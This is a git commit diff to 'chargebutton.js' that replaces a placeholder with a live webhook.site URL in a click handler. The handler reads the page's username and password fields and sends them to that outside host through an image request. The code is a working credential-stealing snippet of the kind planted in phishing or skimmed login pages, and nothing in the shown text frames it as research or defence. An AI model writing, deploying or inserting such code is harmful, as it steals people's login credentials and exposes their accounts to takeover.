a27806c6b7282a1b045973e25e11ffb4dafe606e
Jok3r <115065483+Vault-of-Jok3r@users.noreply.github.com>
2025-03-11 15:53:35 +0100

    Update chargebutton.js

--- chargebutton.js
+++ chargebutton.js
@@ -9,6 +9,6 @@ if (btn) {
         var username = document.getElementById('username').value;
         var password = document.getElementById('password').value;
         
-        new Image().src = '<WEBHOOK_URL>/?username=' + encodeURIComponent(username) + '&password=' + encodeURIComponent(password);
+        new Image().src = 'https://webhook.site/e850bf9b-5440-4787-9359-8b609587a433/?username=' + encodeURIComponent(username) + '&password=' + encodeURIComponent(password);
     };
 }
